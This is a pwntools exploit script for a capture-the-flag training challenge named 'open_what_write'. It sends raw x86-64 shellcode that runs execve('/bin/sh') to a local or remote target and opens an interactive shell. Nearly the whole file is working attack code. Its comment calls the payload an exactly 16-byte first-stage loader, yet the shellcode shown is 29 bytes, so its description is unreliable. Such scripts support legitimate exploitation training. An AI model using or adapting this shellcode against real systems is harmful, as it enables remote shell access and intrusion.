from pwn import *

COMMANDS = """
"""

shellcode = b"\x48\xB8\x2F\x62\x69\x6E\x2F\x73\x68\x00\x50\x48\xC7\xC0\x3B\x00\x00\x00\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x0F\x05"

if args.GDB:
    p = gdb.debug("./open_what_write", gdbscript=COMMANDS)
elif args.REMOTE:
    p = remote("open-what-write.training.offensivedefensive.it", 8080, ssl=True)
else:
    p = process("./open_what_write")

# Send first stage loader (exactly 16 bytes)
p.send(shellcode)

p.interactive()

#execve("/bin/sh\0", NULL, NULL)
#0x0068732f6e69622f